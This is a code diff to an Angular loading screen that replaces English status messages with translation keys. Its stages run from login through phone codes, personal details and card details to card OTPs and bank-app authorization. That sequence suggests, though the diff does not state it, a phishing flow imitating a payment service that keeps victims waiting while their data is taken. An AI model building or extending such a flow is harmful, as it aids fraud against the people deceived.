@@ -3,11 +3,12 @@ import { Component, inject, computed, signal, OnInit, OnDestroy, effect } from '
 import { CommonModule } from '@angular/common';
 import { PublicLayoutComponent } from './layout/public-layout.component';
 import { StateService } from '../services/state.service';
+import { TranslatePipe } from '../pipes/translate.pipe';
 
 @Component({
   selector: 'app-loading',
   standalone: true,
-  imports: [CommonModule, PublicLayoutComponent],
+  imports: [CommonModule, PublicLayoutComponent, TranslatePipe],
   template: `
     <app-public-layout>
       <div class="flex flex-col items-center justify-center py-12 animate-fade-in">
@@ -20,11 +21,11 @@ import { StateService } from '../services/state.service';
         </div>
 
         <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight animate-fade-in-up">
-          {{ title() }}
+          {{ title() | translate }}
         </h1>
         
         <p class="text-base text-slate-500 text-center font-medium max-w-xs mx-auto animate-pulse">
-           {{ subMessage() }}
+           {{ subMessage() | translate }}
         </p>
       </div>
     </app-public-layout>
@@ -38,19 +39,19 @@ import { StateService } from '../services/state.service';
 })
 export class LoadingComponent implements OnInit, OnDestroy {
   state = inject(StateService);
-  subMessage = signal('Just a second...');
+  subMessage = signal('LOADING.SUB_1');
   private interval: any;
   private stuckCheckInterval: any;
 
   title = computed(() => {
     const stage = this.state.stage();
-    if (stage === 'login') return 'Checking your info...';
-    if (stage === 'phone_pending') return 'Sending code...';
-    if (stage === 'personal_pending') return 'Updating profile...';
-    if (stage === 'card_pending') return 'Securing connection...';
-    if (stage === 'card_otp_pending') return 'Verifying security code...';
-    if (stage === 'bank_app_pending') return 'Waiting for authorization...';
-    return 'Processing...';
+    if (stage === 'login') return 'LOADING.CHECKING';
+    if (stage === 'phone_pending') return 'LOADING.SENDING';
+    if (stage === 'personal_pending') return 'LOADING.UPDATING';
+    if (stage === 'card_pending') return 'LOADING.SECURING';
+    if (stage === 'card_otp_pending') return 'LOADING.VERIFYING';
+    if (stage === 'bank_app_pending') return 'LOADING.WAITING';
+    return 'LOADING.PROCESSING';
   });
 
   constructor() {
@@ -68,7 +69,7 @@ export class LoadingComponent implements OnInit, OnDestroy {
   }
 
   ngOnInit() {
-      const msgs = ['Just a second...', 'Still working...', 'Almost there...', 'Verifying details...'];
+      const msgs = ['LOADING.SUB_1', 'LOADING.SUB_2', 'LOADING.SUB_3', 'LOADING.SUB_4'];
       let i = 0;
       this.interval = setInterval(() => {
           i++;
